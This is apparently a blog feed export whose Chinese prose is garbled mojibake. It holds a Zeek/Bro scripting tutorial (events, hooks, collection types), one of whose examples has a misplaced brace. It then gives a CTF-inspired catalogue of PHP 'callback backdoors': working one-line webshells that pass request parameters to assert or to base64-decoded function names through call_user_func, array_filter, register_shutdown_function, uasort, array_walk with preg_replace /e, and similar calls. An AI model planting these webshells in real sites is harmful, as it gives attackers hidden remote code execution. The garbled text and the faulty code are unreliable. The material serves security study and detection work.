<li>å®ƒä»¬æ²¡æœ‰è¿”å›å€¼ï¼Œå› ä¸ºå®ƒä»¬æ²¡æœ‰è¢«ç›´æ¥è°ƒç”¨è€Œæ˜¯è¢«å®‰æ’åœ¨ä»¥åæ‰§è¡Œï¼›</li>
<li>å¯ä»¥ä¸ºåŒä¸€äº‹ä»¶å®šä¹‰å¤šä¸ªä¸»ä½“ï¼Œæ¯ä¸ªä¸»ä½“éƒ½è¢«è§†ä¸ºâ€œäº‹ä»¶å¤„ç†ç¨‹åºâ€ã€‚ å½“éœ€è¦æ‰§è¡Œä¸€ä¸ªäº‹ä»¶æ—¶ï¼Œè¯¥äº‹ä»¶çš„æ‰€æœ‰å¤„ç†ç¨‹åºä¸»ä½“å‡æŒ‰ä¼˜å…ˆçº§é¡ºåºæ‰§è¡Œã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">global myevent: event(s: string);</span><br><span class="line"></span><br><span class="line">global n &#x3D; 1;</span><br><span class="line"></span><br><span class="line">event myevent(s: string) &amp;priority &#x3D; -10</span><br><span class="line">	&#123;</span><br><span class="line">	n &#x3D; n + 2;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">event myevent(s: string) &amp;priority &#x3D; 5</span><br><span class="line">	&#123;</span><br><span class="line">	--n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">event myevent(s: string) &amp;priority &#x3D; 10</span><br><span class="line">	&#123;</span><br><span class="line">	print &quot;myevent&quot;, s, n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	print &quot;bro_init()&quot;;</span><br><span class="line">	event myevent(&quot;hi&quot;);</span><br><span class="line">	event myevent(&quot;wait&quot;);</span><br><span class="line">	schedule 5 sec &#123; myevent(&quot;bye&quot;) &#125;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">event bro_done()</span><br><span class="line">	&#123;</span><br><span class="line">	print &quot;bro_done()&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bro_init()</span><br><span class="line">myevent, hi, 1</span><br><span class="line">myevent, wait, 2</span><br><span class="line">myevent, bye, 3</span><br><span class="line">bro_done()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æˆ‘æŠŠå®˜æ–¹çš„ä¾‹å­ä¿®æ”¹äº†ä¸€ç‚¹ï¼Œæ„Ÿè§‰è¿™æ ·æ›´èƒ½ä½“ç°Eventçš„ç‰¹ç‚¹ã€‚</p>
<p>åœ¨<code>bro_init()</code>ä¸­æ¯æ‰§è¡Œä¸€æ¬¡<code>my_event</code>éƒ½ä¼šæŠŠè¯¥äº‹ä»¶çš„ä¸‰ä¸ªä¸»ä½“æŒ‰ç…§<code>@priority</code>çš„é¡ºåºåˆ†åˆ«æ‰§è¡Œä¸€æ¬¡ã€‚å…¶ä¸­å‰ä¸¤æ¬¡ä¼šä»¥è¿…é€Ÿæ‰§è¡Œ<code>my_event</code>ï¼Œè€Œç¬¬ä¸‰æ¬¡ä¼š5såæˆ–è€…Zeekæ‰§è¡Œç»“æŸä¹‹å‰æ‰§è¡Œã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p>
<ul>
<li>å¦‚æœæ²¡æœ‰æ˜¾ç¤ºæŒ‡å®šï¼Œ<code>@priority</code>å‚æ•°ä¼šé»˜è®¤ä¸º0ï¼›</li>
<li>å¦‚æœ<code>@priority</code>éƒ½ç›¸ç­‰ï¼Œåˆ™æŒ‰é¡ºåºæ‰§è¡Œã€‚</li>
</ul>
<h2 id="Hook">Hook</h2>
<p>Hookæ˜¯å¦å¤–ä¸€ç§å½¢å¼çš„å‡½æ•°ï¼Œä¸Eventç±»ä¼¼ï¼Œä½†æ˜¯åˆæœ‰ä¸¤ç‚¹ä¸å¤ªä¸€æ ·ï¼š</p>
<ul>
<li>å®ƒè¢«è°ƒç”¨æ—¶ä¼šç«‹åˆ»æ‰§è¡Œï¼›</li>
<li>å¦‚æœæ‰§è¡Œåˆ°ä¸»ä½“çš„æœ«å°¾æˆ–è¿”å›è¯­å¥ï¼Œåˆ™å°†æ‰§è¡ŒHookå¤„ç†ç¨‹åºã€‚ ä½†æ˜¯ï¼Œå¦‚æœHookçš„ä¸»ä½“ä»¥breakè¯­å¥ç»ˆæ­¢ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œå…¶ä½™çš„Hookå¤„ç†ç¨‹åºã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">global myhook: hook(s: string)</span><br><span class="line"></span><br><span class="line">hook myhook(s: string) @priority &#x3D; 10</span><br><span class="line">	&#123;</span><br><span class="line">	print &quot;priority 10 myhook handler&quot;, s;</span><br><span class="line">	s &#x3D; &quot;bye&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">hook myhook(s: string)</span><br><span class="line">	&#123;</span><br><span class="line">	print &quot;break out of myhook handling&quot;, s;</span><br><span class="line">	break;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">hook myhook(s: string) &amp;priority &#x3D; -5</span><br><span class="line">	&#123;</span><br><span class="line">	print &quot;not going to happen&quot;, s;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local ret:bool &#x3D; hook myhook(&quot;hi&quot;);</span><br><span class="line">	if ( ret )</span><br><span class="line">		&#123;</span><br><span class="line">		print &quot;all handlers ran&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">priority 10 myhook handler, hi</span><br><span class="line">break out of myhook handling, hi</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Composite-types-Set-é›†åˆ">Composite-types: Set é›†åˆ</h2>
<p><code>set</code>ï¼šé›†åˆç±»å‹ï¼Œå…¶ä¸­å…ƒç´ å”¯ä¸€ï¼Œå¯ä»¥ä½¿ç”¨<code>add</code>å’Œ<code>delete</code>å‡½æ•°å¯¹å…ƒç´ è¿›è¡Œå¢åˆ æ“ä½œï¼Œä»¥åŠ<code>in</code>æ“ä½œç¬¦åˆ¤æ–­æ˜¯å¦å­˜åœ¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local x: set[string] &#x3D; &#123;&quot;one&quot;, &quot;two&quot;, &quot;three&quot;&#125;;</span><br><span class="line">	add x[&quot;four&quot;];</span><br><span class="line">	print &quot;four&quot; in x;</span><br><span class="line">	delete x[&quot;two&quot;];</span><br><span class="line">	print &quot;two&quot; !&#x3D; x;</span><br><span class="line">	add x[&quot;one&quot;];</span><br><span class="line">	</span><br><span class="line">	for (e in x)</span><br><span class="line">		&#123;</span><br><span class="line">		print e;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">T</span><br><span class="line">T</span><br><span class="line">four</span><br><span class="line">three</span><br><span class="line">one</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Composite-types-Table-æ˜ å°„">Composite-types: Table æ˜ å°„</h2>
<p>Zeekä¸­çš„<code>table</code>ç±»å‹ç±»ä¼¼äº<code>dict</code>æˆ–<code>Map</code>ï¼Œç´¢å¼•æ˜¯å”¯ä¸€çš„ï¼Œå¯ä»¥ä½¿ç”¨<code>delete</code>è¿›è¡Œåˆ é™¤æ“ä½œï¼Œå¯ä»¥ç›´æ¥èµ‹å€¼æ“ä½œæ¥æ–°å¢å…ƒç´ ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local x: table[count] of string &#x3D; &#123; [1] &#x3D; &quot;one&quot;,</span><br><span class="line">										[3] &#x3D; &quot;three&quot;,</span><br><span class="line">										[5] &#x3D; &quot;five&quot;&#125;;</span><br><span class="line">	x[7] &#x3D; &quot;seven&quot;;</span><br><span class="line">	print 7 in x;</span><br><span class="line">	delete x[3];</span><br><span class="line">	print 3 !&#x3D; x;</span><br><span class="line">	x[1] &#x3D; &quot;1&quot;; # changed the value at index 1</span><br><span class="line">	</span><br><span class="line">	for (key in x)</span><br><span class="line">		&#123;</span><br><span class="line">		print key;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">T</span><br><span class="line">seven</span><br><span class="line">T</span><br><span class="line">1</span><br><span class="line">7</span><br><span class="line">5</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>table</code>æ•°æ®ç±»å‹å®šä¹‰çš„æ–¹æ³•<code>table [count] of string</code>ã€‚</p>
<h2 id="Composite-types-Vector-å‘é‡">Composite-types: Vector å‘é‡</h2>
<p><code>Vector</code>ç±»ä¼¼äº<code>arrary</code>æˆ–<code>list</code>ï¼Œå…è®¸æœ‰é‡å¤çš„å…ƒç´ ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local x: vector of string &#x3D; &#123;&quot;one&quot;, &quot;two&quot;, &quot;three&quot;&#125;;</span><br><span class="line">	print x;</span><br><span class="line">	print x[1];</span><br><span class="line">	print |x|;</span><br><span class="line">	x[|x|] &#x3D; &quot;one&quot;;</span><br><span class="line">	print x;</span><br><span class="line">	</span><br><span class="line">	for (i in x)</span><br><span class="line">		&#123;</span><br><span class="line">		print i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[one, two, three]</span><br><span class="line">two</span><br><span class="line">3</span><br><span class="line">[one, two, three, one]</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>vector of string</code>æŒ‡æ˜<code>vector</code>ä¸­å…ƒç´ ç±»å‹ã€‚</p>
<h2 id="Composite-types-Record-è®°å½•">Composite-types: Record è®°å½•</h2>
<p><code>Record</code>è®°å½•ç±»å‹ï¼Œç±»ä¼¼äºCè¯­è¨€ä¸­çš„ç»“æ„ä½“ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type MyRecord: record &#123;</span><br><span class="line">	a: string;</span><br><span class="line">	b: count;</span><br><span class="line">	c: bool &amp;default &#x3D; T;</span><br><span class="line">	d: int &amp;optional;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">event bro_init()</span><br><span class="line">	&#123;</span><br><span class="line">	local x &#x3D; MyRecord($a &#x3D; &quot;vvvvvv&quot;, $b &#x3D; 6, $c &#x3D; F, $d &#x3D; -13);</span><br><span class="line">	if (x?$d)</span><br><span class="line">		print x$d;</span><br><span class="line">	&#125;</span><br><span class="line">	print x;</span><br><span class="line">	</span><br><span class="line">	x &#x3D; MyRecord($a &#x3D; &quot;abc&quot;, $b &#x3D; 3);</span><br><span class="line">	print x;</span><br><span class="line">	print x$c;</span><br><span class="line">	print x?$d;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-13</span><br><span class="line">[a&#x3D;vvvvvv, b&#x3D;6, c&#x3D;F, d&#x3D;-13]</span><br><span class="line">[a&#x3D;abc, b&#x3D;3, c&#x3D;T, d&#x3D;&lt;uninitialized&gt;]</span><br><span class="line">T</span><br><span class="line">F</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>$</code>æ“ä½œç¬¦é€šå¸¸ç±»ä¼¼äº<code>.</code>æ“ä½œç¬¦ï¼Œ<code>x?$d</code>ç”¨äºåˆ¤æ–­<code>x</code>ä¸­æ˜¯å¦å­˜åœ¨å­—æ®µ<code>d</code>ã€‚</p>
<h2 id="Zeekç‰¹æœ‰çš„æ•°æ®ç±»å‹">Zeekç‰¹æœ‰çš„æ•°æ®ç±»å‹</h2>
<ul>
<li>timeï¼šæ—¶é—´æˆ³</li>
<li>intervalï¼šæ—¶é—´ç›¸å¯¹å•ä½ï¼ŒåŒ…æ‹¬<code>usec</code>, <code>msec</code>, <code>sec</code>, <code>min</code>, <code>hr</code>, å’Œ<code>day</code></li>
<li>portï¼šç«¯å£</li>
<li>addrï¼šIPåœ°å€</li>
<li>subnetï¼šå­ç½‘</li>
</ul>
]]></content>
      <categories>
        <category>æµé‡åˆ†æ</category>
        <category>Bro</category>
      </categories>
      <tags>
        <tag>Bro</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨å­¦ä¹ ä¹‹å›è°ƒåé—¨</title>
    <url>/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨å­¦ä¹ ä¹‹PHPå›è°ƒåé—¨">Webå®‰å…¨å­¦ä¹ ä¹‹PHPå›è°ƒåé—¨</h1>
<p>åœ¨åšä¸€é“CTFæ¸—é€ç±»å‹çš„é¢˜ç›®æ—¶ï¼Œåšåˆ°æœ€åä¸€æ­¥çœ‹åˆ°äº†<code>array_walk()</code>å‡½æ•°ï¼Œäºæ˜¯ç›´æ¥Googleè¿™ä¸ªå‡½æ•°æ¼æ´ï¼Œæœç„¶å­˜åœ¨ç€å›è°ƒåé—¨ï¼ˆè²Œä¼¼æ˜¯Pç‰›èµ·çš„è¿™ä¸ªåå­—ï¼‰ï¼Œåœ¨æ­¤å»¶ç”³ä¸€ä¸‹çŸ¥è¯†ç‚¹åšä¸€ä¸ªè®°å½•ã€‚</p>
<h2 id="ä»€ä¹ˆæ˜¯å›è°ƒå‡½æ•°">ä»€ä¹ˆæ˜¯å›è°ƒå‡½æ•°</h2>
<p>å›è°ƒå‡½æ•°å°±æ˜¯å°†ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ä¼ å…¥å¦ä¸€ä¸ªå‡½æ•°çš„å‡½æ•°ã€‚phpä¸­æœ‰è®¸å¤šè¿™æ ·çš„å‡½æ•°ï¼Œæ¯”å¦‚<code>call_user_func</code> , <code>call_user_func_array</code>,<code>array_map</code>ç­‰ç­‰ï¼Œè¿™äº›å‡½æ•°å¯ä»¥å°†å‡½æ•°ä½œä¸ºå‚æ•°æ‰§è¡Œåè¿”å›ä¸»å‡½æ•°ï¼Œæ–¹ä¾¿ä½¿ç”¨ï¼Œä½†æ˜¯æ—¢ç„¶å¯ä»¥å°†å‡½æ•°ä½œä¸ºå‚æ•°ä¼ å…¥æ‰§è¡Œï¼Œå¦‚æœå°†ä¸€äº›å±é™©çš„å‡½æ•°ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œé‚£å°±æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªå¯åˆ©ç”¨ä¸”ä¸æ˜“æ£€æµ‹çš„åé—¨ã€‚</p>
<h2 id="ä¼ ç»Ÿçš„å›è°ƒåé—¨">ä¼ ç»Ÿçš„å›è°ƒåé—¨</h2>
<p><code>call_user_func()</code>åœ¨PHPä¸­æ˜¯å›è°ƒçš„æ ‡å‡†çš„å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•° callback æ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ï¼Œè¿”å›å€¼ä¸ºå›è°ƒå‡½æ•°çš„ç»“æœã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call_user_func(<span class="string">&#x27;assert&#x27;</span>, $_REQUEST[<span class="string">&quot;pass&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p><code>assert()</code>å‡½æ•°ç›´æ¥ä½œä¸ºå›è°ƒå‡½æ•°ï¼Œç„¶å<code>$_REQUEST[&quot;pass&quot;]</code>ä½œä¸º<code>assert</code>å‚æ•°è°ƒç”¨ã€‚</p>
<p>å¦å¤–ï¼ŒPHPè¿˜æä¾›å¦å¤–ä¸€ä¸ªç›¸ä¼¼çš„å‡½æ•°<code>call_user_func_array()</code>ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call_user_func_array(<span class="string">&#x27;assert&#x27;</span>, <span class="keyword">array</span>($_REQUEST[<span class="string">&#x27;pass&#x27;</span>]));</span><br></pre></td></tr></table></figure>
<p><code>call_user_func_array</code>å‡½æ•°ï¼Œå’Œ<code>call_user_func</code>ç±»ä¼¼ï¼Œåªæ˜¯ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥ä¼ å…¥å‚æ•°åˆ—è¡¨ç»„æˆçš„æ•°ç»„ã€‚</p>
<h2 id="å•ä¸ªå‚æ•°å›è°ƒåé—¨">å•ä¸ªå‚æ•°å›è°ƒåé—¨</h2>
<blockquote>
<p>æ³¨æ„ï¼šè¿™é‡Œçš„å•ä¸ªå‚æ•°æŒ‡çš„æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ä¸ªæ•°</p>
</blockquote>
<p>å…¶å®ï¼Œåœ¨PHPä¸­è¿˜æœ‰å¾ˆå¤šå›è°ƒå‡½æ•°ï¼Œè¿™äº›å«æœ‰å›è°ƒï¼ˆcallableç±»å‹ï¼‰å‚æ•°çš„å‡½æ•°ï¼Œå…¶å®éƒ½æœ‰åšâ€œå›è°ƒåé—¨â€çš„æ½œåŠ›ã€‚ ä¾‹å¦‚<code>array_filter()</code>å‡½æ•°ï¼š</p>
<blockquote>
<p><code>array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</code><br>
ä¾æ¬¡å°† array æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¼ é€’åˆ° callback å‡½æ•°ã€‚å¦‚æœ callback å‡½æ•°è¿”å› trueï¼Œåˆ™ array æ•°ç»„çš„å½“å‰å€¼ä¼šè¢«åŒ…å«åœ¨è¿”å›çš„ç»“æœæ•°ç»„ä¸­ã€‚æ•°ç»„çš„é”®åä¿ç•™ä¸å˜ã€‚</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">&#x27;pass&#x27;</span>],);</span><br><span class="line">array_filter($arr, base64_decode($e));</span><br></pre></td></tr></table></figure>
<p><code>array_filter</code>å‡½æ•°æ˜¯å°†æ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ éå†å¹¶ç”¨æŒ‡å®šå‡½æ•°å¤„ç†è¿‡æ»¤ç”¨çš„ï¼Œ<code>arr</code>æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½ä¼šä½œä¸ºbase64è§£ç åå‡½æ•°<code>e</code>çš„å‚æ•°ã€‚å¦‚ä¸‹å›¾ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191121222629.png" alt=""></p>
<p>ç±»ä¼¼<code>array_filter</code>ï¼Œ<code>array_map</code>ä¹Ÿæœ‰ç›¸åŒçš„åŠŸæ•ˆï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">&#x27;pass&#x27;</span>],);</span><br><span class="line">array_map(base64_decode($e), $arr);</span><br></pre></td></tr></table></figure>
<p><strong>å•å‚æ•°åé—¨çš„ç»ˆæå¥¥ä¹‰ï¼š</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">register_shutdown_function($e, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line">register_tick_function ($e, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">filter_var($_REQUEST[<span class="string">&#x27;pass&#x27;</span>], FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>));</span><br><span class="line">filter_var_array(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]), <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;filter&#x27;</span> =&gt; FILTER_CALLBACK, <span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>)));</span><br></pre></td></tr></table></figure>
<p>æœ€åä¸€ä¸ªæ˜¯filter_varçš„åˆ©ç”¨ï¼ŒPHPé‡Œç”¨è¿™ä¸ªå‡½æ•°æ¥è¿‡æ»¤æ•°ç»„ï¼Œåªè¦æŒ‡å®šè¿‡æ»¤æ–¹æ³•ä¸ºå›è°ƒï¼ˆFILTER_CALLBACKï¼‰ï¼Œä¸”optionä¸ºassertå³å¯ã€‚</p>
<h2 id="ä¸¤ä¸ªå‚æ•°å›è°ƒåé—¨">ä¸¤ä¸ªå‚æ•°å›è°ƒåé—¨</h2>
<p>åœ¨PHP5.4.8+ç‰ˆæœ¬ä¸­ï¼Œassertæœ‰ä¸€ä¸ªæ–°çš„å¯é€‰å‚æ•°<code>descrition</code>ã€‚</p>
<blockquote>
<p>å…·ä½“å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p>
<p>assert ( mixed $assertion [, string $description ] ) : bool</p>
</blockquote>
<p>æ‰€ä»¥è¾ƒäºä¹‹å‰çš„PHPç‰ˆæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€äº›æ–°çš„æ–¹å¼å»è¿›è¡Œè°ƒç”¨ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">uasort($arr, base64_decode($e));</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ³¨æ„ï¼š<code>$arr</code>æ•°ç»„ä¸­çš„å…ƒç´ éƒ½æ˜¯å›è°ƒå‡½æ•°<code>$e</code>çš„å‚æ•°ï¼</p>
</blockquote>
<p>åœ¨PHP5.4.8ä»¥ä¸Šç‰ˆæœ¬å¯ä»¥æ­£å¸¸æ‰§è¡Œï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191122154659.png" alt=""></p>
<p>è¿˜æœ‰ä¸€äº›ç±»ä¼¼çš„å‡½æ•°ï¼Œæ¯”å¦‚è¯´<code>uksort()</code>ï¼š</p>
<blockquote>
<p>å…·ä½“å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p>
<p>uksort ( array &amp;$array , callable $key_compare_func ) : bool</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">uksort($arr, base64_decode($e));</span><br></pre></td></tr></table></figure>
<p>ä»¥åŠé¢å‘å¯¹è±¡çš„æ–¹æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// way 0</span></span><br><span class="line">$arr = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line">$arr-&gt;uasort(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// way 1</span></span><br><span class="line">$arr = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="number">1</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="number">2</span>));</span><br><span class="line">$arr-&gt;uksort(<span class="string">&#x27;assert&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>å†æ¯”å¦‚<code>array_reduce()</code>ï¼š</p>
<blockquote>
<p>PHP 4 &gt;= 4.0.5, PHP 5, PHP 7)<br>
array_reduce â€” ç”¨å›è°ƒå‡½æ•°è¿­ä»£åœ°å°†æ•°ç»„ç®€åŒ–ä¸ºå•ä¸€çš„å€¼</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">array_reduce($arr = <span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>), base64_decode($_REQUEST[<span class="string">&#x27;e&#x27;</span>]), $_REQUEST[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p><code>array_udiff()</code>å‡½æ•°</p>
<blockquote>
<p>(PHP 5, PHP 7)<br>
array_udiff â€” ç”¨å›è°ƒå‡½æ•°æ¯”è¾ƒæ•°æ®æ¥è®¡ç®—æ•°ç»„çš„å·®é›†</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">array_udiff($arr = <span class="keyword">array</span>($_REQUEST[<span class="string">&#x27;a&#x27;</span>]), $arr1 = <span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>), base64_decode($_REQUEST[<span class="string">&#x27;e&#x27;</span>]));</span><br></pre></td></tr></table></figure>
<h2 id="ä¸‰ä¸ªå‚æ•°å›è°ƒåé—¨">ä¸‰ä¸ªå‚æ•°å›è°ƒåé—¨</h2>
<p>æœ‰äº›å‡½æ•°éœ€è¦çš„å›è°ƒå‡½æ•°ç±»å‹æ¯”è¾ƒè‹›åˆ»ï¼Œå›è°ƒæ ¼å¼éœ€è¦ä¸‰ä¸ªå‚æ•°ï¼Œæ¯”å¦‚<code>array_walk()</code>ã€‚</p>
<blockquote>
<p>å‡½æ•°å®šä¹‰ï¼šarray_walk ( array <code>&amp;$array</code> , callable<code>$callback</code> [, mixed <code>$userdata</code> = <strong><code>NULL</code></strong> ] ) : bool</p>
</blockquote>
<p>å®ƒçš„å‚æ•°è§£é‡Šï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191122165733.png" alt=""></p>
<p>ä¸‰ä¸ªå‚æ•°å¯ä»¥ç”¨<code>preg_replace()</code>ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="string">&#x27;|.*|e&#x27;</span>,);</span><br><span class="line">array_walk($arr, $e, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œæ•ˆæœå¦‚ä¸‹å›¾ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191122191940.png" alt=""></p>
<p>éœ€è¦å¯¹è¿™æ®µä»£ç åšå‡ºä¸€å®šçš„è§£é‡Šï¼š</p>
<p><code>preg_replace</code> å‡½æ•°æ˜¯ç”¨æ¥æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ï¼Œå®ƒçš„å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>preg_replace ( mixed <code>$pattern</code> , mixed <code>$replacement</code> , mixed <code>$subject</code> [, int <code>$limit</code> = -1 [, int <code>&amp;$count</code> ]] ) : mixed</p>
</blockquote>
<p>æ ¹æ®<code>array_walk()</code>å‚æ•°è§£é‡Šå¯ä»¥å¾—å‡ºï¼Œ<code>array_walk($arr, $e, '');</code>ç­‰ä»·äºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">preg_replace(<span class="string">&#x27;|.*|e&#x27;</span>, <span class="string">&#x27;phpinfo()&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
